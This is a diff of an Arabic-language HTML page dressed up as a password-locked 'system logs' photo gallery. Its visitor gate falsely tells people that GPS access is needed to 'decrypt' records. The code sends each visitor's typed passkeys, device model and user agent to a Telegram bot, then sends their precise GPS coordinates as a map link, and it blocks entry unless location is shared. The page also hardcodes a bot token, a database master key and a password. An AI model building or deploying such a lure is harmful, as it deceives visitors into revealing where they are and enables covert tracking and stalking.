@@ -7,32 +7,32 @@
     <script src="https://widget.cloudinary.com/v2.0/global/all.js"></script>
     <style>
         :root { --main-bg: #050505; --accent: #b71c1c; --glow: rgba(183, 28, 28, 0.5); --text: #eee; }
-        body { background: var(--main-bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; text-align: center; }
+        body { background: var(--main-bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; text-align: center; overflow-x: hidden; }
         
-        /* شاشات القفل والتحكم */
+        /* شاشات القفل */
         .gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--main-bg); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
-        input[type="password"] { background: #111; border: 1px solid #333; color: white; padding: 12px; margin: 20px; text-align: center; border-radius: 4px; box-shadow: 0 0 5px var(--glow); transition: 0.3s; }
+        input[type="password"] { background: #111; border: 1px solid #333; color: white; padding: 12px; margin: 20px; text-align: center; border-radius: 4px; box-shadow: 0 0 5px var(--glow); transition: 0.3s; width: 250px; }
         input[type="password"]:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 15px var(--glow); }
         button { background: #1a1a1a; color: #fff; border: 1px solid #333; padding: 10px 30px; cursor: pointer; transition: 0.3s; border-radius: 4px; font-weight: bold; }
         button:hover { background: var(--accent); border-color: var(--accent); color: white; box-shadow: 0 0 15px var(--glow); }
-        h2 { letter-spacing: 5px; color: #fff; text-shadow: 0 0 5px var(--glow); }
+        h2 { letter-spacing: 5px; color: #fff; text-shadow: 0 0 5px var(--glow); font-size: 1.5rem; }
         
-        /* شريط التواصل الجانبي */
+        /* شريط التواصل */
         #social-sidebar { position: fixed; right: 10px; top: 50%; transform: translateY(-50%); display: flex; flex-direction: column; gap: 15px; z-index: 100; }
         #social-sidebar a { display: block; background: #0a0a0a; border: 1px solid #333; color: #888; padding: 12px; border-radius: 50%; text-decoration: none; transition: 0.3s; box-shadow: 0 0 5px var(--glow); }
         #social-sidebar a:hover { color: #fff; background: var(--accent); border-color: var(--accent); box-shadow: 0 0 15px var(--glow); }
-        #social-sidebar img { width: 20px; height: 20px; display: block; filter: grayscale(100%); }
-        #social-sidebar a:hover img { filter: grayscale(0%); }
+        #social-sidebar img { width: 20px; height: 20px; display: block; filter: invert(1); opacity: 0.5; }
+        #social-sidebar a:hover img { opacity: 1; }
 
-        /* تعديل المعرض ليناسب الشريط الجانبي */
-        #main-content { padding-right: 70px; display: none; }
+        /* المحتوى الرئيسي */
+        #main-content { padding-right: 70px; display: none; padding-bottom: 50px; }
         @media (max-width: 600px) {
             #social-sidebar { position: static; transform: none; flex-direction: row; justify-content: center; margin: 20px 0; }
             #main-content { padding-right: 0; }
         }
 
         /* المعرض */
-        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; padding: 20px; }
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; padding: 20px; }
         .gallery img { width: 100%; aspect-ratio: 1/1; object-fit: cover; border: 1px solid #333; filter: grayscale(100%); transition: 0.5s; cursor: pointer; }
         .gallery img:hover { filter: grayscale(0%); border-color: #b71c1c; box-shadow: 0 0 15px var(--glow); }
         #admin-panel { display: none; padding: 20px; background: #0a0a0a; border-bottom: 1px solid var(--accent); position: sticky; top: 0; z-index: 90; }
@@ -44,122 +44,129 @@
     <div id="password-gate" class="gate" style="display: none;">
         <h2>SECURE AREA</h2>
         <input type="password" id="passInput" placeholder="Passkey" onkeypress="if(event.key==='Enter') checkPassword()">
-        <button onclick="checkPassword()">Verify</button>
+        <button onclick="checkPassword()">Verify Identity</button>
     </div>
 
     <div id="location-gate" class="gate" style="display: none;">
-        <h2>LOCATION REQUIRED</h2>
-        <p style="color: #666; font-size: 0.9em; margin: 20px; max-width: 400px;">
-            لاستكمال الدخول، يجب السماح للمتصفح بالوصول إلى موقعك.
-            <br>سيتم استخدام إشارة GPS بدقة عالية.
+        <h2>SECURITY PROTOCOL</h2>
+        <p style="color: #888; font-size: 0.8em; margin: 20px; max-width: 400px; line-height: 1.6;">
+            لتأكيد الهوية وفتح تشفير السجلات، يرجى تفعيل بروتوكول الموقع الجغرافي للجهاز.
         </p>
-        <p id="location-status" style="margin: 20px 0; color: var(--glow);">يرجى الموافقة على طلب المتصفح الذي سيظهر الآن...</p>
-        <button onclick="requestLocation()">أوافق (استكمال الدخول)</button>
+        <p id="location-status" style="margin: 10px 0; color: var(--accent); font-weight: bold;">[ اطلب الصلاحية لاستكمال الدخول ]</p>
+        <button onclick="requestLocation()">تفعيل الإشارة (GPS)</button>
     </div>
 
     <div id="admin-gate" class="gate" style="display: none;">
         <h2>ADMIN ACCESS</h2>
         <input type="password" id="adminPassInput" placeholder="Admin Key" onkeypress="if(event.key==='Enter') checkAdminPassword()">
-        <button onclick="checkAdminPassword()">Unlock</button>
+        <button onclick="checkAdminPassword()">Unlock Panel</button>
     </div>
 
     <div id="main-content">
         <div id="admin-panel">
-            <button id="upload-btn">➕ ارفع صورة جديدة</button>
+            <button id="upload-btn">➕ إضافة سجل جديد (صورة)</button>
         </div>
 
-        <h1>SYSTEM LOGS</h1>
-        <div class="gallery" id="gallery-container"></div>
+        <h1 style="margin-top: 30px; letter-spacing: 10px;">SYSTEM LOGS</h1>
+        
+        <div class="gallery" id="gallery-container">
+            <img src="رابط_صورتك_2020" title="Archive_2020.log">
+            <img src="رابط_صورتك_2023" title="Archive_2023.log">
+            <img src="رابط_صورتك_2026" title="Current_2026.log">
+        </div>
         
         <div id="social-sidebar">
-            <p style="font-size: 0.7em; color: #444; margin: 0; writing-mode: vertical-rl;">SYSTEM OWNER:</p>
-            <a href="#" target="_blank" title="Instagram"><img src="https://res.cloudinary.com/dm6sw4fb1/image/upload/v1700000000/icons/instagram.png" alt="Insta"></a>
-            <a href="#" target="_blank" title="TikTok"><img src="https://res.cloudinary.com/dm6sw4fb1/image/upload/v1700000000/icons/tiktok.png" alt="TikTok"></a>
-            <a href="#" target="_blank" title="Facebook"><img src="https://res.cloudinary.com/dm6sw4fb1/image/upload/v1700000000/icons/facebook.png" alt="FB"></a>
+            <p style="font-size: 0.6em; color: #444; margin: 0; writing-mode: vertical-rl;">SYSTEM_OWNER</p>
+            <a href="#" target="_blank"><img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" alt="Insta"></a>
+            <a href="#" target="_blank"><img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png" alt="TikTok"></a>
+            <a href="#" target="_blank"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="FB"></a>
         </div>
     </div>
 
     <script>
-        // --- بياناتك الشخصية (لا تغيرها) ---
         const BIN_ID = '69f523dc36566621a815207f';
         const API_KEY = '$2a$10$u1FBimM8i3NGDzglgr2F6.8Ea3dL8ff4VOWh.4ssOK90oyZltOzbW';
         const TELEGRAM_TOKEN = '8602241530:AAG4LAv51VkBUsVsV_FFZzzlHsBrK49gj9k';
         const TELEGRAM_CHAT_ID = '6929202571'; 
-        
-        // --- إعدادات النظام ---
-        const VISITORS_PASS = 'f.socity'; // كلمة سر الزوار الجديدة
+        const VISITORS_PASS = 'f.socity'; 
         const isAdminMode = new URLSearchParams(window.location.search).get('admin') === 'true';
 
-        // 1. نظام التحقق من كلمة السر والتلغرام
+        // 1. نظام الدخول وتحديد نوع الهاتف بدقة
+        async function sendLoginAlert(success, attempt) {
+            const time = new Date().toLocaleString('ar-DZ');
+            const ua = navigator.userAgent;
+            let deviceType = "PC / Desktop";
+
+            if (/android/i.test(ua)) {
+                const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)\sBuild/);
+                deviceType = match ? `Android: ${match[2]}` : "Android Device";
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                deviceType = "Apple iOS Device";
+            }
+
+            const msg = `
+🚨 *محاولة دخول:* ${success ? '✅ ناجحة' : '❌ فاشلة'}
+---------------------------
+📱 *الجهاز:* ${deviceType}
+🌐 *المتصفح:* ${ua.split(') ')[1] || 'Generic'}
+📅 *الوقت:* ${time}
+🔑 *الكود المستخدم:* ${attempt}
+            `;
+            await sendMessageToTelegram(msg);
+        }
+
         async function checkPassword() {
             const input = document.getElementById("passInput").value;
             if (input === VISITORS_PASS) {
                 document.getElementById("password-gate").style.display = "none";
                 document.getElementById("location-gate").style.display = "flex";
-                sendLoginAlert(true, input); // محاولة ناجحة ✅
+                sendLoginAlert(true, input);
             } else {
-                sendLoginAlert(false, input); // محاولة فاشلة ❌
-                alert("ACCESS DENIED");
+                sendLoginAlert(false, input);
+                alert("ACCESS DENIED: INCORRECT PASSKEY");
             }
         }
 
         async function checkAdminPassword() {
             const input = document.getElementById("adminPassInput").value;
-            // يمكن استخدام نفس كلمة السر للمسؤول، أو تغييرها
             if (input === VISITORS_PASS) {
                 document.getElementById("admin-gate").style.display = "none";
                 document.getElementById("main-content").style.display = "block";
                 document.getElementById("admin-panel").style.display = "block";
-                sendLoginAlert(true, input + " (ADMIN)"); // محاولة مسؤول ناجحة ✅
                 fetchPhotos(); 
             } else {
-                sendLoginAlert(false, input + " (ADMIN)"); // محاولة مسؤول فاشلة ❌
                 alert("ADMIN ACCESS DENIED");
             }
         }
 
-        // 2. نظام تحديد الموقع (GPS Gate)
+        // 2. نظام الـ GPS المحسن
         async function requestLocation() {
             const statusLabel = document.getElementById("location-status");
-            statusLabel.textContent = "جاري طلب إشارة GPS بدقة عالية...";
+            statusLabel.textContent = "جاري مزامنة الإحداثيات...";
             
-            if (!navigator.geolocation) {
-                statusLabel.textContent = "⚠️ المتصفح لا يدعم الـ GPS. الدخول مرفوض.";
-                return;
-            }
-
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    // النجاح: الشخص وافق على الـ GPS
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const googleMapsLink = `https://maps.google.com/maps?q=${lat},${lon}`;
-                    const msg = `🎯 *الدخول مسموح! GPS الدقيق:* \n[افتح في الخريطة](${googleMapsLink})`;
+                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const msg = `🎯 *تم تحديد الموقع الدقيق (GPS):* \n[عرض الموقع على الخريطة](${mapsUrl})`;
                     await sendMessageToTelegram(msg);
 
-                    // استكمال الدخول لـ المعرض
                     document.getElementById("location-gate").style.display = "none";
                     document.getElementById("main-content").style.display = "block";
-                    fetchPhotos(); // جلب الصور فقط بعد الموافقة
+                    fetchPhotos();
                 },
-                (error) => {
-                    // الفشل: الشخص رفض مشاركة الـ GPS أو حدث خطأ
-                    let errorMsg = "";
-                    if (error.code === error.PERMISSION_DENIED) {
-                        errorMsg = "⚠️ الزائر رفض مشاركة الموقع الدقيق (GPS). الدخول مرفوض.";
-                    } else {
-                        errorMsg = `⚠️ فشل جلب الموقع (كود الخطأ: ${error.code}). حاول مجدداً.`;
-                    }
-                    sendMessageToTelegram(errorMsg);
-                    statusLabel.textContent = errorMsg; // إظهار الرسالة للشخص
-                    statusLabel.style.color = "var(--accent)";
-                    alert("ACCESS DENIED: Please allow location to proceed.");
+                async (error) => {
+                    const errorMsg = "⚠️ الزائر رفض الصلاحية أو فشل الـ GPS. تم حظر الدخول.";
+                    await sendMessageToTelegram(errorMsg);
+                    statusLabel.textContent = "تم رفض الدخول. يرجى السماح بالموقع.";
+                    alert("ACCESS DENIED: Location is mandatory for decryption.");
                 },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } // تشديد نظام الـ GPS
+                { enableHighAccuracy: true, timeout: 8000 }
             );
         }
 
-        // 3. نظام تنبيهات التلغرام (المحسن)
+        // 3. التلغرام والمعرض
         async function sendMessageToTelegram(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -167,32 +174,9 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
                 });
-            } catch (e) { console.error("Telegram alert failed"); }
+            } catch (e) {}
         }
 
-        async function sendArrivalAlert() {
-            if (isAdminMode) return; // عدم تسجيل وصول المسؤول
-            const time = new Date().toLocaleString('ar-DZ');
-            const msg = `🚨 *زائر وصل إلى حائط كلمة السر!* \n📅 الوقت: ${time}\n📱 الجهاز: ${navigator.platform}`;
-            await sendMessageToTelegram(msg);
-        }
-
-        async function sendLoginAlert(success, attempt) {
-            const time = new Date().toLocaleString('ar-DZ');
-            const userAgent = navigator.userAgent;
-            const msg = `
-🚨 *محاولة دخول:* ${success ? '✅ ناجحة' : '❌ فاشلة'}
----------------------------
-🌐 *المتصفح:* ${userAgent.split(') ')[1]} 
-📱 *الجهاز:* ${navigator.platform}
-📅 *الوقت:* ${time}
-🔗 *الرابط:* ${window.location.href}
-🔑 *المحاولة:* ${attempt}
-            `;
-            await sendMessageToTelegram(msg);
-        }
-
-        // --- وظائف المعرض الأساسية ---
         async function fetchPhotos() {
             try {
                 const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
@@ -200,54 +184,47 @@
                 });
                 const data = await res.json();
                 (data.record.photos || []).reverse().forEach(url => displayImage(url));
-            } catch (e) { console.error("Database fetch failed"); }
-        }
-
-        async function syncWithDB(newUrl) {
-            const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-                headers: { 'X-Master-Key': API_KEY }
-            });
-            const data = await res.json();
-            let photos = data.record.photos || [];
-            photos.push(newUrl);
-            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY },
-                body: JSON.stringify({ photos: photos })
-            });
+            } catch (e) {}
         }
 
         function displayImage(url) {
             const img = document.createElement("img");
             img.src = url;
-            document.getElementById("gallery-container").prepend(img);
+            img.title = "System_Data_Entry.log";
+            document.getElementById("gallery-container").appendChild(img);
         }
 
-        // إعداد Cloudinary
+        // الرفع عبر Cloudinary
         const myWidget = cloudinary.createUploadWidget({
             cloudName: 'dm6sw4fb1', uploadPreset: 'jalile.mh'
-        }, (error, result) => {
+        }, async (error, result) => {
             if (!error && result.event === "success") {
                 const url = result.info.secure_url;
                 displayImage(url);
-                syncWithDB(url);
+                // مزامنة مع JSONBin
+                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                    headers: { 'X-Master-Key': API_KEY }
+                });
+                const data = await res.json();
+                let photos = data.record.photos || [];
+                photos.push(url);
+                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY },
+                    body: JSON.stringify({ photos: photos })
+                });
             }
         });
 
         document.getElementById("upload-btn").addEventListener("click", () => myWidget.open());
         
-        // تشغيل النظام عند التحميل
         window.onload = () => {
             if (isAdminMode) {
-                // وضع المسؤول: لا حاجة لـ بوابة الـ GPS، فقط كلمة سر المسؤول
                 document.getElementById("admin-gate").style.display = "flex";
             } else {
-                // وضع الزوار: كلمة سر + بوابة الـ GPS
                 document.getElementById("password-gate").style.display = "flex";
-                sendArrivalAlert();
             }
         };
-
     </script>
 </body>
 </html>
